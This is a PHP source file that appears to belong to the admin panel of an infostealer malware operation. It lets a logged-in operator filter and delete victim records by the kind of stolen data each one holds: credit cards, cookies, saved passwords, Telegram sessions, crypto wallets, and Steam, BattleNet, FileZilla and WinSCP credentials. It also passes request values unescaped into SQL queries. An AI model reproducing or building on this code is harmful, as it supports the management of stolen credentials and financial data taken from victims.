<?php
session_start();

require("config.php");
require("mysql.php");

function filter($norm, $arr){
	$quest = "SELECT * FROM `users` WHERE id > -1";
	
	foreach($norm['norm'] as $n){
		if($n=='cc'){ $quest.=' && cc > 0'; $arr['cc'] = 'checked';}
		if($n=='autof'){ $quest.=' && autof > 0'; $arr['autof'] = 'checked';}
		if($n=='cookies'){ $quest.=' && cookies > 0'; $arr['cookies'] = 'checked';}
		if($n=='filezilla'){ $quest.=' && filezilla > 0'; $arr['filezilla'] = 'checked';}
		if($n=='passwords'){ $quest.=' && passwords > 0'; $arr['passwords'] = 'checked';}
		if($n=='telegram'){ $quest.=' && telegram > 0'; $arr['telegram'] = 'checked';}
		if($n=='wallet'){ $quest.=' && wallet > 0'; $arr['wallet'] = 'checked';}
		if($n=='pidgin'){ $quest.=' && pidgin > 0'; $arr['pidgin'] = 'checked';}
		if($n=='psi'){ $quest.=' && psi > 0'; $arr['psi'] = 'checked';}
		if($n=='psiplus'){ $quest.=' && psiplus > 0'; $arr['psiplus'] = 'checked';}
		if($n=='steam'){ $quest.=' && steam > 0'; $arr['steam'] = 'checked';}
		if($n=='BattleNet'){ $quest.=' && BattleNet > 0'; $arr['BattleNet'] = 'checked';}
		if($n=='WINSCP'){ $quest.=' && WINSCP > 0'; $arr['WINSCP'] = 'checked';}
	}
	
	return array($quest, $arr);
}

if(isset($_SESSION["session_username"])){
	if(isset($_POST['id'])){
		$answer = $base->query("DELETE FROM `users` WHERE id  =".$_POST['id']." LIMIT 1");
		$row = $answer->fetchAll();
		header("Location: index.php?page=".$_GET['page']);
	}
	
	if(isset($_POST['filter'])){
		
		$arr = []; 
		$quest = filter($_POST, $arr)[0];
		
		$answer = $base->query($quest);
		$rows = $answer->fetchAll();
		
		foreach($rows as $row){
			$answer = $base->query("DELETE FROM `users` WHERE id =".$row['id']." LIMIT 1");
			$answer->fetchAll();
		}
		
		header("Location: index.php?page=".$_GET['page']);
	}
	
	if(isset($_POST['all'])){
		
		$answer = $base->query("DELETE FROM `users`");
		$rows = $answer->fetchAll();
		$answer = $base->query("DELETE FROM `country`");
		$rows = $answer->fetchAll();
		
		header("Location: index.php?page=".$_GET['page']);
	}
	
}

?>